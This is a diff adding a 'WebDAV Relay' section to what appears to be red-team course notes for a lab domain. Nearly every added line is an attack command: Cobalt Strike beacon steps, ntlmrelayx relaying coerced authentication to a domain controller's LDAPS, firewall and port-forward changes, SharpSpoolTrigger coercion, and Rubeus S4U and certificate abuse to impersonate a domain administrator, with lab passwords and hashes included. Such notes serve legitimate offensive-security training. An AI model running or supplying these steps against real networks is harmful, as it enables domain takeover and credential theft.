@@ -1070,6 +1070,54 @@ C:\Users\nlamb>dir \\10.10.123.102\relayme
 C:\Users\nlamb>dir \\wkstn-2\relayme
 # 8. Verify the access in weblog and use link command to connect with SMB beacon
 beacon> link dc-2.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
+
+# -------------------------------------------------------------------------------
+# WebDAV Relay
+
+# Check if WebClient service is running on current machine.
+C:\Users\bfarmer>sc qc WebClient
+
+# Use GetWebDAVStatus enumerate remote hosts that may have WebClient service running.
+# This is possible because the WebClient service creates a named pipe called DAV RPC SERVICE.
+beacon> inline-execute C:\Tools\GetWebDAVStatus\GetWebDAVStatus_BOF\GetWebDAVStatus_x64.o wkstn-1,wkstn-2
+
+# Relay with RBCD
+
+# 1. Run ntlmrelayx to relay the authentication material to LDAP in a Domain Controller.
+# This is the command to exploit it through RBCD, with the --delegate-access flag.
+# The advantage over regular NTLM Relay is that this is not bound to port 445, you just need a port that has
+# Inbound connection allowed in Windows Firewall
+attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t ldaps://10.10.122.10 --delegate-access -smb2support --http-port 8888
+
+# 2. Allow port 8888 on Firewall and do Remote Port Forwarding
+beacon> powershell New-NetFirewallRule -DisplayName "8888-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8888
+beacon> rportfwd 8888 localhost 8888
+
+# 3. Use SharpSpoolTrigger to coerce authentication from WKSTN-1 to WKSTN-2
+beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe wkstn-1 wkstn-2@8888/pwned
+
+# 4. Use the password created for the new machine account in the relay process to generate the AES256 hash with Rubeus
+PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /domain:dev.cyberbotic.io /user:PVWUMPYT$ /password:'4!t1}}I_CGJ}0OJ'
+
+# 5. Perform the S4U2Proxy abuse with that
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:PVWUMPYT$ /impersonateuser:nlamb /msdsspn:cifs/wkstn-1.dev.cyberbotic.io /aes256:46B94228F43282498F562FEF99C5C4AF67269BE5C8AD31B193135C7BD38A28A2 /nowrap
+
+# Relay with Shadow Credentials
+
+# 1. Run ntlmrelayx to relay the authentication material to LDAP in a Domain Controller.
+# This is the command to exploit it through Shadow Credentials, with the --shadow-credentials flag.
+# The advantage over regular NTLM Relay is that this is not bound to port 445, you just need a port that has
+# Inbound connection allowed in Windows Firewall.
+# This will automatically dump a certificate file for you
+attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t ldaps://10.10.122.10 --shadow-credentials -smb2support --http-port 8888
+
+# 2. Encode certificate to base64 to be used with Rubeus
+attacker@ubuntu ~> cat ROsU1G59.pfx | base64 -w 0
+
+# 3. Request a TGT to be used with S4U2Self
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:MIII3Q[...snip...]YFLqI= /password:wBaP2YhsR7RgY0MZ6jwk /nowrap
+
+# Ensure the keys are deleted after the attack.
 ```
 
 ### Data Protection API (DPAPI)
